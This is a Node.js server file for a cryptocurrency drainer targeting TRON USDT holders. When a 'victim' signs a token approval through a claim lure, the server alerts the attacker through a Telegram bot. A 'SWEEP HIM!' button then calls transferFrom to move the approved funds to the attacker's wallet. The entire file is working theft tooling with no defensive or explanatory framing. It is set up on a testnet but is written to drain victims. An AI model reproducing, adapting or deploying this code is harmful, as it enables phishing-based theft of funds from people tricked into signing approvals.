require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const { TronWeb } = require('tronweb');

const app = express();
app.use(cors());
app.use(express.json());

const tronWeb = new TronWeb({
  fullHost: 'https://api.shasta.trongrid.io',
  privateKey: process.env.ATTACKER_PRIVATE_KEY // Must be Account 01 Private Key
});

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const ATTACKER_ADDRESS = tronWeb.defaultAddress.base58; // Derived from private key

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper: Format numbers
const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

// 1. ALERT ENDPOINT (Called by Frontend when victim clicks Claim)
app.post('/api/alert', async (req, res) => {
  const { victimAddress, txHash } = req.body;
  console.log(`[ALERT] Received approval from ${victimAddress}`);

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = await token.balanceOf(victimAddress).call();
    const balanceNum = Number(bal.toString()) / 1e6;

    // OPTIONAL: Send Gas (50 TRX) to victim so their next tx doesn't fail
    // Uncomment below if you want auto-gas. Ensure Attacker has TRX.
    /*
    try {
      await tronWeb.trx.sendTransaction(victimAddress, tronWeb.toSun(50));
      console.log(`[GAS] Sent 50 TRX to ${victimAddress}`);
    } catch (gasErr) { console.log('[GAS] Failed or unnecessary', gasErr.message); }
    */

    const message = `🚨 *VICTIM CONNECTED & APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Approve Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to drain.`;
    
    const keyboard = {
      inline_keyboard: [[
        { text: '🕷️ SWEEP HIM!', callback_data: `sweep_${victimAddress}` },
        { text: '📊 Check Balance', callback_data: `bal_${victimAddress}` }
      ]]
    };

    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// 2. SWEEP ACTION (The Drain)
bot.action(/sweep_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Initiating Drain...');
  await ctx.editMessageText(`🕷️ *Draining funds from* \`${addr}\`...`, { parse_mode: 'Markdown' });

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    
    // Check Balance and Allowance
    const bal = BigInt((await token.balanceOf(addr).call()).toString());
    const allow = BigInt((await token.allowance(addr, ATTACKER_ADDRESS).call()).toString());
    const amount = bal < allow ? bal : allow;

    if (amount === 0n) {
      return ctx.editMessageText(`❌ *Drain Failed.*\nBalance or Allowance is 0.\nVictim must sign 'Approve' first.`);
    }

    // EXECUTE TRANSFERFROM (Bulletproof)
    // transferFrom(fromAddress, toAddress, amount)
    const tx = await token.transferFrom(addr, ATTACKER_ADDRESS, amount.toString()).send({ feeLimit: 100000000 });
    
    let info = await tronWeb.trx.getTransactionInfo(tx);
    let tries = 0;
    while ((!info || !info.id) && tries < 10) { await new Promise(r => setTimeout(r, 2000)); info = await tronWeb.trx.getTransactionInfo(tx); tries++; }

    if (info && info.id) {
      await ctx.editMessageText(`✅ *SUCCESSFULLY DRAINED*\n\n👤 From: \`${addr}\`\n💸 To: \`${ATTACKER_ADDRESS}\`\n💰 Amount: **${fmt(Number(amount)/1e6)} USDT**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${tx})`);
    } else {
      ctx.editMessageText(`❌ Transaction pending/failed.`);
    }
  } catch (e) {
    console.error(e);
    ctx.editMessageText(`❌ *Drain Error:*\n${e.message}`);
  }
});

// 3. BALANCE CHECK ACTION
bot.action(/bal_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Reading...');
  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = Number((await token.balanceOf(addr).call()).toString()) / 1e6;
    ctx.editMessageText(`📊 *Balance Check*\n👤 \`${addr}\`\n💰 **${fmt(bal)} USDT**`);
  } catch (e) { ctx.editMessageText(`❌ Read failed.`); }
});

// Start Server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`🛡️ Backend running on port ${PORT}`));
bot.launch().then(() => console.log('✅ Telegram bot listening.'));